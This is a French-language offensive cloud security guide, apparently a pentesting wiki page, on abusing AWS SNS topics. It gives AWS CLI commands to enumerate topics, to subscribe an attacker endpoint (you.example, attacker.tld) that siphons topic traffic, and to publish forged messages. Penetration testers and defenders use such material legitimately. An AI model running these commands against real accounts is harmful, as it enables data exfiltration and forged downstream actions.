---
title: "SNS : publier sur des topics et s'y abonner"
description: "Abuser des topics et abonnements SNS pour publier des messages, capturer des notifications ou exfiltrer des données."
keywords:
  - SNS
  - topic
  - subscription
  - publish
  - notification
---

# SNS

Simple Notification Service diffuse un message publié vers chaque abonné d'un topic. Avec `sns:Publish`, vous injectez des messages auxquels les systèmes en aval font confiance, et avec `sns:Subscribe`, vous ajoutez votre propre endpoint à un topic et recevez tout ce qui y transite, ce qui transforme un topic en canal de capture de données ou d'exfiltration.

## Énumérer les topics et leurs politiques

```bash
aws sns list-topics
aws sns get-topic-attributes --topic-arn <arn>   # Policy shows who can Publish/Subscribe
aws sns list-subscriptions-by-topic --topic-arn <arn>
```

Une politique de topic qui autorise `sns:Subscribe` ou `sns:Publish` largement (ou en cross-account) est l'ouverture.

## Capturer et injecter

```bash
# subscribe an endpoint you control to siphon the topic
aws sns subscribe --topic-arn <arn> --protocol https --notification-endpoint https://you.example/sink
aws sns subscribe --topic-arn <arn> --protocol email --notification-endpoint you@attacker.tld

# publish a forged message downstream consumers will act on
aws sns publish --topic-arn <arn> --message '{"event":"forged"}'
```

## Notes d'exploitation

- Un abonnement HTTPS doit confirmer le jeton d'abonnement que SNS envoie à l'endpoint ; hébergez un listener qui le confirme automatiquement.
- Les messages publiés sont dignes de confiance pour les abonnés (files, Lambdas, webhooks) : l'injection peut donc provoquer des actions en aval, pas seulement du bruit.
- Les topics transportent souvent des événements applicatifs contenant des champs sensibles ; un abonnement est une lecture discrète de ce flux.

## Outils

- **AWS CLI** (`sns subscribe` / `publish`) : capture et injection.
- **Pacu** (`sns__enum`) : énumération des topics et abonnements.

## Références

- [HackTricks Cloud : abus de SNS AWS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-sns-enum.html)
- [AWS : contrôle d'accès SNS](https://docs.aws.amazon.com/sns/latest/dg/sns-access-policy-language-overview.html)
- [Rhino Security Labs : recherche offensive AWS](https://rhinosecuritylabs.com/aws/)
- [Hacking the Cloud : techniques offensives AWS](https://hackingthe.cloud/)
